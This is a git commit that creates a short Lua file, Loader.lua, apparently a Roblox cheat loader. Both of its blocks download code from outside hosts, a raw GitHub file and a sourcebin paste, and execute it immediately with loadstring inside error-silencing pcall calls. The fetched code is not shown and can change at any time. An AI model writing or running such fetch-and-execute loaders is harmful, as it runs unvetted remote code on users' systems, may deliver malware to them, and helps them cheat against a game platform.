2189762efb01f464dde6ea307cce2074aea1794a
HKTwoScript <jancmafs@gmail.com>
2025-07-20 11:07:10 +0200

    Create Loader.lua

---
+++ Loader.lua
@@ -0,0 +1,7 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/f1It2DyEU8/0", true))()
+end)
